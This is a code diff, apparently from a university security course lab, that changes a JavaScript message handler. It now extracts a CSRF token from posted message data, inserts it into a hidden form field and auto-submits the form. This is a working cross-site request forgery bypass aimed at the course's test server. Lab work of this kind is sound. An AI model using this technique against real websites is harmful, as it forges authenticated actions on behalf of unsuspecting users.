@@ -16,12 +16,14 @@ var actualURL = "http://cis551.cis.upenn.edu/project3/search?xssdefense=0&csrfde
 console.log(actualURL);
 
 window.addEventListener("message",function (e) {
-	console.log(e)
+        var token = e.data.split("csrf_token=")[1].split(";")[0];
+	console.log(token);
 	var input = document.createElement("input");
 	input.type = "hidden";
 	input.name = "csrf_token";
-	input.value = new String(e.data);
-	// document.getElementById("form1").appendChild(input);
+	input.value = token;
+	document.getElementById("csrfForm").appendChild(input);
+	document.getElementById("csrfForm").submit();
 },false);
 
 
